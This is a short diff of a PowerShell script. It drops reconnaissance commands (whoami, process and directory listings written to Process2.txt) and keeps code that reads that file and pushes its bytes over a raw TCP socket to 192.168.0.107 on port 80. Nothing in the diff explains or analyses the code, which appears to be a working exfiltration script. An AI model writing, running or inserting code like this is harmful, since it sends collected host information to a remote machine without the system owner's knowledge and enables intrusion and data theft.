@@ -6,17 +6,6 @@ cd Network
 
 Write-Output $var | Out-File -FilePath ./Process2.txt
 
-whoami | Out-File -FilePath ./Process2.txt -Append
-
-Start-Sleep -Seconds 1.5
-
-ps | Out-File -FilePath ./Process2.txt -Append
-
-Start-Sleep -Seconds 1.5
-
-ls | Out-File -FilePath ./Process2.txt -Append
-
-#start http post 
 
 $test=[io.file]::ReadAllBytes("./Process2.txt");
 $socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
@@ -24,6 +13,3 @@ $stream = $socket.GetStream();
 $stream.write($test,0,$test.Length);
 $writer.flush();
 $socket.close()
-
-
-
